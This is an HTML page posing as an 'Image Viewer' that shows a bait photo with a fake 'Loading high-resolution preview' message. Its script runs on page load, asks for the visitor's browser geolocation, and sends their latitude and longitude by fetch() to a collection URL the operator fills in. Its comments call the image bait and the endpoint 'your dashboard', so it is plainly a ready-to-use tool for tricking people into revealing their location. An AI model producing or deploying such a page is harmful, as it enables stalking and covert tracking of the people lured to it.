<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: white; text-align: center; font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        img { width: 100%; max-width: 500px; border-radius: 8px; margin-top: 20px; }
        p { font-size: 14px; color: #888; margin-top: 10px; }
    </style>
</head>
<body onload="getLocation()"> <img src="bait.jpg" id="photo">
    <p>Loading high-resolution preview...</p>

    <script>
        // REPLACE THIS with your Pipedream/RequestBin URL
        const gate = "https://your-pipedream-url.m.pipedream.net";

        function getLocation() {
            if (navigator.geolocation) {
                // This triggers the browser popup instantly
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            }
        }

        function showPosition(position) {
            // Sends the Latitude and Longitude to your dashboard
            fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude + "&type=InstantImage");
        }

        function showError(error) {
            // If they deny, it just does nothing or stays on the photo
            console.log("Location denied.");
        }
    </script>
</body>
</html>
